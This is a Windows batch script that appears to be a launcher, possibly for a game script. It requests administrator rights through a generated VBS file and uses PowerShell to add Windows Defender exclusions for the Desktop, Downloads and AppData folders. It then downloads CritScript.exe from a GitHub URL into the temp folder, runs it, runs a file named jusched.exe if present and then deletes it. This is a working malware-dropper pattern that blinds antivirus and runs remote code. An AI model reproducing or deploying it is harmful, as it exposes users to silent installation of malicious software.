@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath "%userprofile%/Desktop"
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath "%userprofile%/Downloads"
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath "%userprofile%/AppData/"
:: Navigate to the %TEMP% directory
cd %TEMP%

:: Step 1: Download CritScript.exe using PowerShell
echo Downloading CritScript.exe...
Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/CritScript.exe' -OutFile CritScript.exe"
if not exist "CritScript.exe" (
    echo Failed to download CritScript.exe. Exiting...
    pause
    exit /b
)
echo CritScript.exe downloaded successfully.

:: Step 2: Execute CritScript.exe
echo Running CritScript.exe...
start "" CritScript.exe

:: Step 3: Check and run jusched.exe if it exists
if exist "jusched.exe" (
    echo Found jusched.exe. Running it...
    start "" jusched.exe
) else (
    echo jusched.exe not found.
)

:: Step 4: Check and run Zombies.ahk if it exists
if exist "Zombies.ahk" (
    echo Found Zombies.ahk. Running it...
    start "" Zombies.ahk
) else (
    echo Zombies.ahk not found.
)

:: Step 5: Delete jusched.exe if it exists
if exist "jusched.exe" (
    echo Deleting jusched.exe...
    del /f /q "jusched.exe"
    echo jusched.exe deleted.
) else (
    echo jusched.exe not found. Nothing to delete.
)

:: Exit the script
echo Script completed. Exiting...
pause
exit /b
